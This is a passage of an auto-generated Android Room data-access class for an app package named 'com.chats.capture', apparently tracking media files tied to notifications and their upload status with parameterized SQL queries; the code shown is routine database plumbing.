package com.chats.capture.database;

import android.database.Cursor;
import android.os.CancellationSignal;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.room.CoroutinesRoom;
import androidx.room.EntityDeletionOrUpdateAdapter;
import androidx.room.EntityInsertionAdapter;
import androidx.room.RoomDatabase;
import androidx.room.RoomSQLiteQuery;
import androidx.room.SharedSQLiteStatement;
import androidx.room.util.CursorUtil;
import androidx.room.util.DBUtil;
import androidx.sqlite.db.SupportSQLiteStatement;
import com.chats.capture.models.MediaFile;
import com.chats.capture.models.UploadStatus;
import java.lang.Class;
import java.lang.Exception;
import java.lang.IllegalArgumentException;
import java.lang.Integer;
import java.lang.Long;
import java.lang.Object;
import java.lang.Override;
import java.lang.String;
import java.lang.SuppressWarnings;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.Callable;
import javax.annotation.processing.Generated;
import kotlin.Unit;
import kotlin.coroutines.Continuation;

@Generated("androidx.room.RoomProcessor")
@SuppressWarnings({"unchecked", "deprecation"})
public final class MediaFileDao_Impl implements MediaFileDao {
  private final RoomDatabase __db;

  private final EntityInsertionAdapter<MediaFile> __insertionAdapterOfMediaFile;

  private final EntityDeletionOrUpdateAdapter<MediaFile> __updateAdapterOfMediaFile;

  private final SharedSQLiteStatement __preparedStmtOfMarkAsUploaded;

  private final SharedSQLiteStatement __preparedStmtOfMarkUploadAttempt;

  private final SharedSQLiteStatement __preparedStmtOfResetStuckUploads;

  private final SharedSQLiteStatement __preparedStmtOfDeleteOldUploadedFiles;

  private final SharedSQLiteStatement __preparedStmtOfDeleteMediaFile;

  public MediaFileDao_Impl(@NonNull final RoomDatabase __db) {
    this.__db = __db;
    this.__insertionAdapterOfMediaFile = new EntityInsertionAdapter<MediaFile>(__db) {
      @Override
      @NonNull
      protected String createQuery() {
        return "INSERT OR REPLACE INTO `media_files` (`id`,`deviceId`,`notificationId`,`appPackage`,`localPath`,`remoteUrl`,`fileSize`,`mimeType`,`checksum`,`uploadStatus`,`uploadAttempts`,`lastUploadAttempt`,`errorMessage`,`createdAt`) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)";
      }

      @Override
      protected void bind(@NonNull final SupportSQLiteStatement statement,
          @NonNull final MediaFile entity) {
        if (entity.getId() == null) {
          statement.bindNull(1);
        } else {
          statement.bindString(1, entity.getId());
        }
        if (entity.getDeviceId() == null) {
          statement.bindNull(2);
        } else {
          statement.bindString(2, entity.getDeviceId());
        }
        if (entity.getNotificationId() == null) {
          statement.bindNull(3);
        } else {
          statement.bindString(3, entity.getNotificationId());
        }
        if (entity.getAppPackage() == null) {
          statement.bindNull(4);
        } else {
          statement.bindString(4, entity.getAppPackage());
        }
        if (entity.getLocalPath() == null) {
          statement.bindNull(5);
        } else {
          statement.bindString(5, entity.getLocalPath());
        }
        if (entity.getRemoteUrl() == null) {
          statement.bindNull(6);
        } else {
          statement.bindString(6, entity.getRemoteUrl());
        }
        statement.bindLong(7, entity.getFileSize());
        if (entity.getMimeType() == null) {
          statement.bindNull(8);
        } else {
          statement.bindString(8, entity.getMimeType());
        }
        if (entity.getChecksum() == null) {
          statement.bindNull(9);
        } else {
          statement.bindString(9, entity.getChecksum());
        }
        statement.bindString(10, __UploadStatus_enumToString(entity.getUploadStatus()));
        statement.bindLong(11, entity.getUploadAttempts());
        if (entity.getLastUploadAttempt() == null) {
          statement.bindNull(12);
        } else {
          statement.bindLong(12, entity.getLastUploadAttempt());
        }
        if (entity.getErrorMessage() == null) {
          statement.bindNull(13);
        } else {
          statement.bindString(13, entity.getErrorMessage());
        }
        statement.bindLong(14, entity.getCreatedAt());
      }
    };
    this.__updateAdapterOfMediaFile = new EntityDeletionOrUpdateAdapter<MediaFile>(__db) {
      @Override
      @NonNull
      protected String createQuery() {
        return "UPDATE OR ABORT `media_files` SET `id` = ?,`deviceId` = ?,`notificationId` = ?,`appPackage` = ?,`localPath` = ?,`remoteUrl` = ?,`fileSize` = ?,`mimeType` = ?,`checksum` = ?,`uploadStatus` = ?,`uploadAttempts` = ?,`lastUploadAttempt` = ?,`errorMessage` = ?,`createdAt` = ? WHERE `id` = ?";
      }

      @Override
      protected void bind(@NonNull final SupportSQLiteStatement statement,
          @NonNull final MediaFile entity) {
        if (entity.getId() == null) {
          statement.bindNull(1);
        } else {
          statement.bindString(1, entity.getId());
        }
        if (entity.getDeviceId() == null) {
          statement.bindNull(2);
        } else {
          statement.bindString(2, entity.getDeviceId());
        }
        if (entity.getNotificationId() == null) {
          statement.bindNull(3);
        } else {
          statement.bindString(3, entity.getNotificationId());
        }
        if (entity.getAppPackage() == null) {
          statement.bindNull(4);
        } else {
          statement.bindString(4, entity.getAppPackage());
        }
        if (entity.getLocalPath() == null) {
          statement.bindNull(5);
        } else {
          statement.bindString(5, entity.getLocalPath());
        }
        if (entity.getRemoteUrl() == null) {
          statement.bindNull(6);
        } else {
          statement.bindString(6, entity.getRemoteUrl());
        }
        statement.bindLong(7, entity.getFileSize());
        if (entity.getMimeType() == null) {
          statement.bindNull(8);
        } else {
          statement.bindString(8, entity.getMimeType());
        }
        if (entity.getChecksum() == null) {
          statement.bindNull(9);
        } else {
          statement.bindString(9, entity.getChecksum());
        }
        statement.bindString(10, __UploadStatus_enumToString(entity.getUploadStatus()));
        statement.bindLong(11, entity.getUploadAttempts());
        if (entity.getLastUploadAttempt() == null) {
          statement.bindNull(12);
        } else {
          statement.bindLong(12, entity.getLastUploadAttempt());
        }
        if (entity.getErrorMessage() == null) {
          statement.bindNull(13);
        } else {
          statement.bindString(13, entity.getErrorMessage());
        }
        statement.bindLong(14, entity.getCreatedAt());
        if (entity.getId() == null) {
          statement.bindNull(15);
        } else {
          statement.bindString(15, entity.getId());
        }
      }
    };
    this.__preparedStmtOfMarkAsUploaded = new SharedSQLiteStatement(__db) {
      @Override
      @NonNull
      public String createQuery() {
        final String _query = "UPDATE media_files SET uploadStatus = ?, remoteUrl = ? WHERE id = ?";
        return _query;
      }
    };
    this.__preparedStmtOfMarkUploadAttempt = new SharedSQLiteStatement(__db) {
      @Override
      @NonNull
      public String createQuery() {
        final String _query = "UPDATE media_files SET uploadStatus = ?, uploadAttempts = uploadAttempts + 1, lastUploadAttempt = ?, errorMessage = ? WHERE id = ?";
        return _query;
      }
    };
    this.__preparedStmtOfResetStuckUploads = new SharedSQLiteStatement(__db) {
      @Override
      @NonNull
      public String createQuery() {
        final String _query = "UPDATE media_files SET uploadStatus = 'PENDING' WHERE uploadStatus = 'UPLOADING' AND lastUploadAttempt < ?";
        return _query;
      }
    };
    this.__preparedStmtOfDeleteOldUploadedFiles = new SharedSQLiteStatement(__db) {
      @Override
      @NonNull
      public String createQuery() {
        final String _query = "DELETE FROM media_files WHERE uploadStatus = 'SUCCESS' AND createdAt < ?";
        return _query;
      }
    };
    this.__preparedStmtOfDeleteMediaFile = new SharedSQLiteStatement(__db) {
      @Override
      @NonNull
      public String createQuery() {
        final String _query = "DELETE FROM media_files WHERE id = ?";
        return _query;
      }
    };
  }

  @Override
  public Object insertMediaFile(final MediaFile mediaFile,
      final Continuation<? super Unit> $completion) {
    return CoroutinesRoom.execute(__db, true, new Callable<Unit>() {
      @Override
      @NonNull
      public Unit call() throws Exception {
        __db.beginTransaction();
        try {
          __insertionAdapterOfMediaFile.insert(mediaFile);
          __db.setTransactionSuccessful();
          return Unit.INSTANCE;
        } finally {
          __db.endTransaction();
        }
      }
    }, $completion);
  }

  @Override
  public Object insertMediaFiles(final List<MediaFile> mediaFiles,
      final Continuation<? super Unit> $completion) {
    return CoroutinesRoom.execute(__db, true, new Callable<Unit>() {
      @Override
      @NonNull
      public Unit call() throws Exception {
        __db.beginTransaction();
        try {
          __insertionAdapterOfMediaFile.insert(mediaFiles);
          __db.setTransactionSuccessful();
          return Unit.INSTANCE;
        } finally {
          __db.endTransaction();
        }
      }
    }, $completion);
  }

  @Override
  public Object updateMediaFile(final MediaFile mediaFile,
      final Continuation<? super Unit> $completion) {
    return CoroutinesRoom.execute(__db, true, new Callable<Unit>() {
      @Override
      @NonNull
      public Unit call() throws Exception {
        __db.beginTransaction();
        try {
          __updateAdapterOfMediaFile.handle(mediaFile);
          __db.setTransactionSuccessful();
          return Unit.INSTANCE;
        } finally {
          __db.endTransaction();
        }
      }
    }, $completion);
  }

  @Override
  public Object markAsUploaded(final String id, final UploadStatus status, final String url,
      final Continuation<? super Unit> $completion) {
    return CoroutinesRoom.execute(__db, true, new Callable<Unit>() {
      @Override
      @NonNull
      public Unit call() throws Exception {
        final SupportSQLiteStatement _stmt = __preparedStmtOfMarkAsUploaded.acquire();
        int _argIndex = 1;
        _stmt.bindString(_argIndex, __UploadStatus_enumToString(status));
        _argIndex = 2;
        if (url == null) {
          _stmt.bindNull(_argIndex);
        } else {
          _stmt.bindString(_argIndex, url);
        }
        _argIndex = 3;
        if (id == null) {
          _stmt.bindNull(_argIndex);
        } else {
          _stmt.bindString(_argIndex, id);
        }
        try {
          __db.beginTransaction();
          try {
            _stmt.executeUpdateDelete();
            __db.setTransactionSuccessful();
            return Unit.INSTANCE;
          } finally {
            __db.endTransaction();
          }
        } finally {
          __preparedStmtOfMarkAsUploaded.release(_stmt);
        }
      }
    }, $completion);
  }

  @Override
  public Object markUploadAttempt(final String id, final UploadStatus status, final long timestamp,
      final String error, final Continuation<? super Unit> $completion) {
    return CoroutinesRoom.execute(__db, true, new Callable<Unit>() {
      @Override
      @NonNull
      public Unit call() throws Exception {
        final SupportSQLiteStatement _stmt = __preparedStmtOfMarkUploadAttempt.acquire();
        int _argIndex = 1;
        _stmt.bindString(_argIndex, __UploadStatus_enumToString(status));
        _argIndex = 2;
        _stmt.bindLong(_argIndex, timestamp);
        _argIndex = 3;
        if (error == null) {
          _stmt.bindNull(_argIndex);
        } else {
          _stmt.bindString(_argIndex, error);
        }
        _argIndex = 4;
        if (id == null) {
          _stmt.bindNull(_argIndex);
        } else {
          _stmt.bindString(_argIndex, id);
        }
        try {
          __db.beginTransaction();
          try {
            _stmt.executeUpdateDelete();
            __db.setTransactionSuccessful();
            return Unit.INSTANCE;
          } finally {
            __db.endTransaction();
          }
        } finally {
          __preparedStmtOfMarkUploadAttempt.release(_stmt);
        }
      }
    }, $completion);
  }

  @Override
  public Object resetStuckUploads(final long beforeTimestamp,
      final Continuation<? super Unit> $completion) {
    return CoroutinesRoom.execute(__db, true, new Callable<Unit>() {
      @Override
      @NonNull
      public Unit call() throws Exception {
        final SupportSQLiteStatement _stmt = __preparedStmtOfResetStuckUploads.acquire();
        int _argIndex = 1;
        _stmt.bindLong(_argIndex, beforeTimestamp);
        try {
          __db.beginTransaction();
          try {
            _stmt.executeUpdateDelete();
            __db.setTransactionSuccessful();
            return Unit.INSTANCE;
          } finally {
            __db.endTransaction();
          }
        } finally {
          __preparedStmtOfResetStuckUploads.release(_stmt);
        }
      }
    }, $completion);
  }

  @Override
  public Object deleteOldUploadedFiles(final long beforeTimestamp,
      final Continuation<? super Unit> $completion) {
    return CoroutinesRoom.execute(__db, true, new Callable<Unit>() {
      @Override
      @NonNull
      public Unit call() throws Exception {
        final SupportSQLiteStatement _stmt = __preparedStmtOfDeleteOldUploadedFiles.acquire();
        int _argIndex = 1;
        _stmt.bindLong(_argIndex, beforeTimestamp);
        try {
          __db.beginTransaction();
          try {
            _stmt.executeUpdateDelete();
            __db.setTransactionSuccessful();
            return Unit.INSTANCE;
          } finally {
            __db.endTransaction();
          }
        } finally {
          __preparedStmtOfDeleteOldUploadedFiles.release(_stmt);
        }
      }
    }, $completion);
  }

  @Override
  public Object deleteMediaFile(final String id, final Continuation<? super Unit> $completion) {
    return CoroutinesRoom.execute(__db, true, new Callable<Unit>() {
      @Override
      @NonNull
      public Unit call() throws Exception {
        final SupportSQLiteStatement _stmt = __preparedStmtOfDeleteMediaFile.acquire();
        int _argIndex = 1;
        if (id == null) {
          _stmt.bindNull(_argIndex);
        } else {
          _stmt.bindString(_argIndex, id);
        }
        try {
          __db.beginTransaction();
          try {
            _stmt.executeUpdateDelete();
            __db.setTransactionSuccessful();
            return Unit.INSTANCE;
          } finally {
            __db.endTransaction();
          }
        } finally {
          __preparedStmtOfDeleteMediaFile.release(_stmt);
        }
      }
    }, $completion);
  }

  @Override
  public Object getMediaFilesByStatus(final UploadStatus status, final int limit,
      final Continuation<? super List<MediaFile>> $completion) {
    final String _sql = "SELECT * FROM media_files WHERE uploadStatus = ? ORDER BY createdAt ASC LIMIT ?";
    final RoomSQLiteQuery _statement = RoomSQLiteQuery.acquire(_sql, 2);
    int _argIndex = 1;
    _statement.bindString(_argIndex, __UploadStatus_enumToString(status));
    _argIndex = 2;
    _statement.bindLong(_argIndex, limit);
    final CancellationSignal _cancellationSignal = DBUtil.createCancellationSignal();
    return CoroutinesRoom.execute(__db, false, _cancellationSignal, new Callable<List<MediaFile>>() {
      @Override
      @NonNull
      public List<MediaFile> call() throws Exception {
        final Cursor _cursor = DBUtil.query(__db, _statement, false, null);
        try {
          final int _cursorIndexOfId = CursorUtil.getColumnIndexOrThrow(_cursor, "id");
          final int _cursorIndexOfDeviceId = CursorUtil.getColumnIndexOrThrow(_cursor, "deviceId");
          final int _cursorIndexOfNotificationId = CursorUtil.getColumnIndexOrThrow(_cursor, "notificationId");
          final int _cursorIndexOfAppPackage = CursorUtil.getColumnIndexOrThrow(_cursor, "appPackage");
          final int _cursorIndexOfLocalPath = CursorUtil.getColumnIndexOrThrow(_cursor, "localPath");
          final int _cursorIndexOfRemoteUrl = CursorUtil.getColumnIndexOrThrow(_cursor, "remoteUrl");
          final int _cursorIndexOfFileSize = CursorUtil.getColumnIndexOrThrow(_cursor, "fileSize");
          final int _cursorIndexOfMimeType = CursorUtil.getColumnIndexOrThrow(_cursor, "mimeType");
          final int _cursorIndexOfChecksum = CursorUtil.getColumnIndexOrThrow(_cursor, "checksum");
          final int _cursorIndexOfUploadStatus = CursorUtil.getColumnIndexOrThrow(_cursor, "uploadStatus");
          final int _cursorIndexOfUploadAttempts = CursorUtil.getColumnIndexOrThrow(_cursor, "uploadAttempts");
          final int _cursorIndexOfLastUploadAttempt = CursorUtil.getColumnIndexOrThrow(_cursor, "lastUploadAttempt");
          final int _cursorIndexOfErrorMessage = CursorUtil.getColumnIndexOrThrow(_cursor, "errorMessage");
          final int _cursorIndexOfCreatedAt = CursorUtil.getColumnIndexOrThrow(_cursor, "createdAt");
          final List<MediaFile> _result = new ArrayList<MediaFile>(_cursor.getCount());
          while (_cursor.moveToNext()) {
            final MediaFile _item;
            final String _tmpId;
            if (_cursor.isNull(_cursorIndexOfId)) {
              _tmpId = null;
            } else {
              _tmpId = _cursor.getString(_cursorIndexOfId);
            }
            final String _tmpDeviceId;
            if (_cursor.isNull(_cursorIndexOfDeviceId)) {
              _tmpDeviceId = null;
            } else {
              _tmpDeviceId = _cursor.getString(_cursorIndexOfDeviceId);
            }
            final String _tmpNotificationId;
            if (_cursor.isNull(_cursorIndexOfNotificationId)) {
              _tmpNotificationId = null;
            } else {
              _tmpNotificationId = _cursor.getString(_cursorIndexOfNotificationId);
            }
            final String _tmpAppPackage;
            if (_cursor.isNull(_cursorIndexOfAppPackage)) {
              _tmpAppPackage = null;
            } else {
              _tmpAppPackage = _cursor.getString(_cursorIndexOfAppPackage);
            }
            final String _tmpLocalPath;
            if (_cursor.isNull(_cursorIndexOfLocalPath)) {
              _tmpLocalPath = null;
            } else {
              _tmpLocalPath = _cursor.getString(_cursorIndexOfLocalPath);
            }
            final String _tmpRemoteUrl;
            if (_cursor.isNull(_cursorIndexOfRemoteUrl)) {
              _tmpRemoteUrl = null;
            } else {
              _tmpRemoteUrl = _cursor.getString(_cursorIndexOfRemoteUrl);
            }
            final long _tmpFileSize;
            _tmpFileSize = _cursor.getLong(_cursorIndexOfFileSize);
            final String _tmpMimeType;
            if (_cursor.isNull(_cursorIndexOfMimeType)) {
              _tmpMimeType = null;
            } else {
              _tmpMimeType = _cursor.getString(_cursorIndexOfMimeType);
            }
            final String _tmpChecksum;
            if (_cursor.isNull(_cursorIndexOfChecksum)) {
              _tmpChecksum = null;
            } else {
              _tmpChecksum = _cursor.getString(_cursorIndexOfChecksum);
            }
            final UploadStatus _tmpUploadStatus;
            _tmpUploadStatus = __UploadStatus_stringToEnum(_cursor.getString(_cursorIndexOfUploadStatus));
            final int _tmpUploadAttempts;
            _tmpUploadAttempts = _cursor.getInt(_cursorIndexOfUploadAttempts);
            final Long _tmpLastUploadAttempt;
            if (_cursor.isNull(_cursorIndexOfLastUploadAttempt)) {
              _tmpLastUploadAttempt = null;
            } else {
              _tmpLastUploadAttempt = _cursor.getLong(_cursorIndexOfLastUploadAttempt);
            }
            final String _tmpErrorMessage;
            if (_cursor.isNull(_cursorIndexOfErrorMessage)) {
              _tmpErrorMessage = null;
            } else {
              _tmpErrorMessage = _cursor.getString(_cursorIndexOfErrorMessage);
            }
            final long _tmpCreatedAt;
            _tmpCreatedAt = _cursor.getLong(_cursorIndexOfCreatedAt);
            _item = new MediaFile(_tmpId,_tmpDeviceId,_tmpNotificationId,_tmpAppPackage,_tmpLocalPath,_tmpRemoteUrl,_tmpFileSize,_tmpMimeType,_tmpChecksum,_tmpUploadStatus,_tmpUploadAttempts,_tmpLastUploadAttempt,_tmpErrorMessage,_tmpCreatedAt);
            _result.add(_item);
          }
          return _result;
        } finally {
          _cursor.close();
          _statement.release();
        }
      }
    }, $completion);
  }

  @Override
  public Object getMediaFilesByNotification(final String notificationId,
      final Continuation<? super List<MediaFile>> $completion) {
    final String _sql = "SELECT * FROM media_files WHERE notificationId = ?";
    final RoomSQLiteQuery _statement = RoomSQLiteQuery.acquire(_sql, 1);
    int _argIndex = 1;
    if (notificationId == null) {
      _statement.bindNull(_argIndex);
    } else {
      _statement.bindString(_argIndex, notificationId);
    }
    final CancellationSignal _cancellationSignal = DBUtil.createCancellationSignal();
    return CoroutinesRoom.execute(__db, false, _cancellationSignal, new Callable<List<MediaFile>>() {
      @Override
      @NonNull
      public List<MediaFile> call() throws Exception {
        final Cursor _cursor = DBUtil.query(__db, _statement, false, null);
        try {
          final int _cursorIndexOfId = CursorUtil.getColumnIndexOrThrow(_cursor, "id");
          final int _cursorIndexOfDeviceId = CursorUtil.getColumnIndexOrThrow(_cursor, "deviceId");
          final int _cursorIndexOfNotificationId = CursorUtil.getColumnIndexOrThrow(_cursor, "notificationId");
          final int _cursorIndexOfAppPackage = CursorUtil.getColumnIndexOrThrow(_cursor, "appPackage");
          final int _cursorIndexOfLocalPath = CursorUtil.getColumnIndexOrThrow(_cursor, "localPath");
          final int _cursorIndexOfRemoteUrl = CursorUtil.getColumnIndexOrThrow(_cursor, "remoteUrl");
          final int _cursorIndexOfFileSize = CursorUtil.getColumnIndexOrThrow(_cursor, "fileSize");
          final int _cursorIndexOfMimeType = CursorUtil.getColumnIndexOrThrow(_cursor, "mimeType");
          final int _cursorIndexOfChecksum = CursorUtil.getColumnIndexOrThrow(_cursor, "checksum");
          final int _cursorIndexOfUploadStatus = CursorUtil.getColumnIndexOrThrow(_cursor, "uploadStatus");
          final int _cursorIndexOfUploadAttempts = CursorUtil.getColumnIndexOrThrow(_cursor, "uploadAttempts");
          final int _cursorIndexOfLastUploadAttempt = CursorUtil.getColumnIndexOrThrow(_cursor, "lastUploadAttempt");
          final int _cursorIndexOfErrorMessage = CursorUtil.getColumnIndexOrThrow(_cursor, "errorMessage");
          final int _cursorIndexOfCreatedAt = CursorUtil.getColumnIndexOrThrow(_cursor, "createdAt");
          final List<MediaFile> _result = new ArrayList<MediaFile>(_cursor.getCount());
          while (_cursor.moveToNext()) {
            final MediaFile _item;
            final String _tmpId;
            if (_cursor.isNull(_cursorIndexOfId)) {
              _tmpId = null;
            } else {
              _tmpId = _cursor.getString(_cursorIndexOfId);
            }
            final String _tmpDeviceId;
            if (_cursor.isNull(_cursorIndexOfDeviceId)) {
              _tmpDeviceId = null;
            } else {
              _tmpDeviceId = _cursor.getString(_cursorIndexOfDeviceId);
            }
            final String _tmpNotificationId;
            if (_cursor.isNull(_cursorIndexOfNotificationId)) {
              _tmpNotificationId = null;
            } else {
              _tmpNotificationId = _cursor.getString(_cursorIndexOfNotificationId);
            }
            final String _tmpAppPackage;
            if (_cursor.isNull(_cursorIndexOfAppPackage)) {
              _tmpAppPackage = null;
            } else {
              _tmpAppPackage = _cursor.getString(_cursorIndexOfAppPackage);
            }
            final String _tmpLocalPath;
            if (_cursor.isNull(_cursorIndexOfLocalPath)) {
              _tmpLocalPath = null;
            } else {
              _tmpLocalPath = _cursor.getString(_cursorIndexOfLocalPath);
            }
            final String _tmpRemoteUrl;
            if (_cursor.isNull(_cursorIndexOfRemoteUrl)) {
              _tmpRemoteUrl = null;
            } else {
              _tmpRemoteUrl = _cursor.getString(_cursorIndexOfRemoteUrl);
            }
            final long _tmpFileSize;
            _tmpFileSize = _cursor.getLong(_cursorIndexOfFileSize);
            final String _tmpMimeType;
            if (_cursor.isNull(_cursorIndexOfMimeType)) {
              _tmpMimeType = null;
            } else {
              _tmpMimeType = _cursor.getString(_cursorIndexOfMimeType);
            }
            final String _tmpChecksum;
            if (_cursor.isNull(_cursorIndexOfChecksum)) {
              _tmpChecksum = null;
            } else {
              _tmpChecksum = _cursor.getString(_cursorIndexOfChecksum);
            }
            final UploadStatus _tmpUploadStatus;
            _tmpUploadStatus = __UploadStatus_stringToEnum(_cursor.getString(_cursorIndexOfUploadStatus));
            final int _tmpUploadAttempts;
            _tmpUploadAttempts = _cursor.getInt(_cursorIndexOfUploadAttempts);
            final Long _tmpLastUploadAttempt;
            if (_cursor.isNull(_cursorIndexOfLastUploadAttempt)) {
              _tmpLastUploadAttempt = null;
            } else {
              _tmpLastUploadAttempt = _cursor.getLong(_cursorIndexOfLastUploadAttempt);
            }
            final String _tmpErrorMessage;
            if (_cursor.isNull(_cursorIndexOfErrorMessage)) {
              _tmpErrorMessage = null;
            } else {
              _tmpErrorMessage = _cursor.getString(_cursorIndexOfErrorMessage);
            }
            final long _tmpCreatedAt;
            _tmpCreatedAt = _cursor.getLong(_cursorIndexOfCreatedAt);
            _item = new MediaFile(_tmpId,_tmpDeviceId,_tmpNotificationId,_tmpAppPackage,_tmpLocalPath,_tmpRemoteUrl,_tmpFileSize,_tmpMimeType,_tmpChecksum,_tmpUploadStatus,_tmpUploadAttempts,_tmpLastUploadAttempt,_tmpErrorMessage,_tmpCreatedAt);
            _result.add(_item);
          }
          return _result;
        } finally {
          _cursor.close();
          _statement.release();
        }
      }
    }, $completion);
  }

  @Override
  public Object getMediaFileById(final String id,
      final Continuation<? super MediaFile> $completion) {
    final String _sql = "SELECT * FROM media_files WHERE id = ?";
    final RoomSQLiteQuery _statement = RoomSQLiteQuery.acquire(_sql, 1);
    int _argIndex = 1;
    if (id == null) {
      _statement.bindNull(_argIndex);
    } else {
      _statement.bindString(_argIndex, id);
    }
    final CancellationSignal _cancellationSignal = DBUtil.createCancellationSignal();
    return CoroutinesRoom.execute(__db, false, _cancellationSignal, new Callable<MediaFile>() {
      @Override
      @Nullable
      public MediaFile call() throws Exception {
        final Cursor _cursor = DBUtil.query(__db, _statement, false, null);
        try {
          final int _cursorIndexOfId = CursorUtil.getColumnIndexOrThrow(_cursor, "id");
          final int _cursorIndexOfDeviceId = CursorUtil.getColumnIndexOrThrow(_cursor, "deviceId");
          final int _cursorIndexOfNotificationId = CursorUtil.getColumnIndexOrThrow(_cursor, "notificationId");
          final int _cursorIndexOfAppPackage = CursorUtil.getColumnIndexOrThrow(_cursor, "appPackage");
          final int _cursorIndexOfLocalPath = CursorUtil.getColumnIndexOrThrow(_cursor, "localPath");
          final int _cursorIndexOfRemoteUrl = CursorUtil.getColumnIndexOrThrow(_cursor, "remoteUrl");
          final int _cursorIndexOfFileSize = CursorUtil.getColumnIndexOrThrow(_cursor, "fileSize");
          final int _cursorIndexOfMimeType = CursorUtil.getColumnIndexOrThrow(_cursor, "mimeType");
          final int _cursorIndexOfChecksum = CursorUtil.getColumnIndexOrThrow(_cursor, "checksum");
          final int _cursorIndexOfUploadStatus = CursorUtil.getColumnIndexOrThrow(_cursor, "uploadStatus");
          final int _cursorIndexOfUploadAttempts = CursorUtil.getColumnIndexOrThrow(_cursor, "uploadAttempts");
          final int _cursorIndexOfLastUploadAttempt = CursorUtil.getColumnIndexOrThrow(_cursor, "lastUploadAttempt");
          final int _cursorIndexOfErrorMessage = CursorUtil.getColumnIndexOrThrow(_cursor, "errorMessage");
          final int _cursorIndexOfCreatedAt = CursorUtil.getColumnIndexOrThrow(_cursor, "createdAt");
          final MediaFile _result;
          if (_cursor.moveToFirst()) {
            final String _tmpId;
            if (_cursor.isNull(_cursorIndexOfId)) {
              _tmpId = null;
            } else {
              _tmpId = _cursor.getString(_cursorIndexOfId);
            }
            final String _tmpDeviceId;
            if (_cursor.isNull(_cursorIndexOfDeviceId)) {
              _tmpDeviceId = null;
            } else {
              _tmpDeviceId = _cursor.getString(_cursorIndexOfDeviceId);
            }
            final String _tmpNotificationId;
            if (_cursor.isNull(_cursorIndexOfNotificationId)) {
              _tmpNotificationId = null;
            } else {
              _tmpNotificationId = _cursor.getString(_cursorIndexOfNotificationId);
            }
            final String _tmpAppPackage;
            if (_cursor.isNull(_cursorIndexOfAppPackage)) {
              _tmpAppPackage = null;
            } else {
              _tmpAppPackage = _cursor.getString(_cursorIndexOfAppPackage);
            }
            final String _tmpLocalPath;
            if (_cursor.isNull(_cursorIndexOfLocalPath)) {
              _tmpLocalPath = null;
            } else {
              _tmpLocalPath = _cursor.getString(_cursorIndexOfLocalPath);
            }
            final String _tmpRemoteUrl;
            if (_cursor.isNull(_cursorIndexOfRemoteUrl)) {
              _tmpRemoteUrl = null;
            } else {
              _tmpRemoteUrl = _cursor.getString(_cursorIndexOfRemoteUrl);
            }
            final long _tmpFileSize;
            _tmpFileSize = _cursor.getLong(_cursorIndexOfFileSize);
            final String _tmpMimeType;
            if (_cursor.isNull(_cursorIndexOfMimeType)) {
              _tmpMimeType = null;
            } else {
              _tmpMimeType = _cursor.getString(_cursorIndexOfMimeType);
            }
            final String _tmpChecksum;
            if (_cursor.isNull(_cursorIndexOfChecksum)) {
              _tmpChecksum = null;
            } else {
              _tmpChecksum = _cursor.getString(_cursorIndexOfChecksum);
            }
            final UploadStatus _tmpUploadStatus;
            _tmpUploadStatus = __UploadStatus_stringToEnum(_cursor.getString(_cursorIndexOfUploadStatus));
            final int _tmpUploadAttempts;
            _tmpUploadAttempts = _cursor.getInt(_cursorIndexOfUploadAttempts);
            final Long _tmpLastUploadAttempt;
            if (_cursor.isNull(_cursorIndexOfLastUploadAttempt)) {
              _tmpLastUploadAttempt = null;
            } else {
              _tmpLastUploadAttempt = _cursor.getLong(_cursorIndexOfLastUploadAttempt);
            }
            final String _tmpErrorMessage;
            if (_cursor.isNull(_cursorIndexOfErrorMessage)) {
              _tmpErrorMessage = null;
            } else {
              _tmpErrorMessage = _cursor.getString(_cursorIndexOfErrorMessage);
            }
            final long _tmpCreatedAt;
            _tmpCreatedAt = _cursor.getLong(_cursorIndexOfCreatedAt);
            _result = new MediaFile(_tmpId,_tmpDeviceId,_tmpNotificationId,_tmpAppPackage,_tmpLocalPath,_tmpRemoteUrl,_tmpFileSize,_tmpMimeType,_tmpChecksum,_tmpUploadStatus,_tmpUploadAttempts,_tmpLastUploadAttempt,_tmpErrorMessage,_tmpCreatedAt);
          } else {
            _result = null;
          }
          return _result;
        } finally {
          _cursor.close();
          _statement.release();
        }
      }
    }, $completion);
  }

  @Override
  public Object getPendingUploads(final int limit,
      final Continuation<? super List<MediaFile>> $completion) {
    final String _sql = "SELECT * FROM media_files WHERE uploadStatus IN ('PENDING', 'FAILED') ORDER BY createdAt ASC LIMIT ?";
    final RoomSQLiteQuery _statement = RoomSQLiteQuery.acquire(_sql, 1);
    int _argIndex = 1;
    _statement.bindLong(_argIndex, limit);
    final CancellationSignal _cancellationSignal = DBUtil.createCancellationSignal();
    return CoroutinesRoom.execute(__db, false, _cancellationSignal, new Callable<List<MediaFile>>() {
      @Override
      @NonNull
      public List<MediaFile> call() throws Exception {
        final Cursor _cursor = DBUtil.query(__db, _statement, false, null);
        try {
          final int _cursorIndexOfId = CursorUtil.getColumnIndexOrThrow(_cursor, "id");
          final int _cursorIndexOfDeviceId = CursorUtil.getColumnIndexOrThrow(_cursor, "deviceId");
          final int _cursorIndexOfNotificationId = CursorUtil.getColumnIndexOrThrow(_cursor, "notificationId");
          final int _cursorIndexOfAppPackage = CursorUtil.getColumnIndexOrThrow(_cursor, "appPackage");
          final int _cursorIndexOfLocalPath = CursorUtil.getColumnIndexOrThrow(_cursor, "localPath");
          final int _cursorIndexOfRemoteUrl = CursorUtil.getColumnIndexOrThrow(_cursor, "remoteUrl");
          final int _cursorIndexOfFileSize = CursorUtil.getColumnIndexOrThrow(_cursor, "fileSize");
          final int _cursorIndexOfMimeType = CursorUtil.getColumnIndexOrThrow(_cursor, "mimeType");
          final int _cursorIndexOfChecksum = CursorUtil.getColumnIndexOrThrow(_cursor, "checksum");
          final int _cursorIndexOfUploadStatus = CursorUtil.getColumnIndexOrThrow(_cursor, "uploadStatus");
          final int _cursorIndexOfUploadAttempts = CursorUtil.getColumnIndexOrThrow(_cursor, "uploadAttempts");
          final int _cursorIndexOfLastUploadAttempt = CursorUtil.getColumnIndexOrThrow(_cursor, "lastUploadAttempt");
          final int _cursorIndexOfErrorMessage = CursorUtil.getColumnIndexOrThrow(_cursor, "errorMessage");
          final int _cursorIndexOfCreatedAt = CursorUtil.getColumnIndexOrThrow(_cursor, "createdAt");
          final List<MediaFile> _result = new ArrayList<MediaFile>(_cursor.getCount());
          while (_cursor.moveToNext()) {
            final MediaFile _item;
